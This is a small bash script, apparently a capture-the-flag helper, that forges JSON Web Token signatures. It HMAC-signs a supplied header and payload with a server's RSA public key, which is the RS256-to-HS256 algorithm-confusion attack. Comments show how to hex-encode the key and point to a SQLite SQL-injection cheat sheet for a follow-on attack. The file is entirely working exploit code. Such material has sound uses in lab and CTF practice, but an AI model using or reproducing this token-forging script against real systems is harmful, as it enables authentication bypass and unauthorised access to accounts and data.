#! /bin/bash 
S="$1"
#root@ihsan:~/Masaüstü# cat key.pem | xxd -p | tr -d "\\n"
#or
#echo "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n" | xxd -p | tr -d "\\n"

xx=$(echo -n "$S" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b434151454139356f546d39444e7a63487238674c686a5a61590a6b7473626a314b7878554f6f7a7730747250393342674970587636576970515242356c716f66506c5536464239394a6335515a303435397437336767564451690a5875434d4932686f55664a31566d6a4e6557437253724455686f6b49465a457543756d6568777774554e75457630657a4335345a5464454335595354414f7a670a6a4957616c73486a2f6761355a45447833457874304d683541457762414437332b7158532f7543766866616a67707a484764394f674e515536304c4d66326d480a2b46796e4e736a4e4e776f356e52653774523132576232594f437877327664616d4f316e316b662f534d7970534b4b764f676a3579304c476955336a65584d780a563857532b5969594355354f42416d54637a3277326b7a42685a466c4836524b346d717565784a487261323349477635554a354756504558706443714b3354720a30774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a)

x=$(cut -d' ' -f2<<<$xx)

echo $x

python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$x')).replace('=','')\")"

#HS256
#https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet
#./UnderConstruction HEADER.PAYLOAD
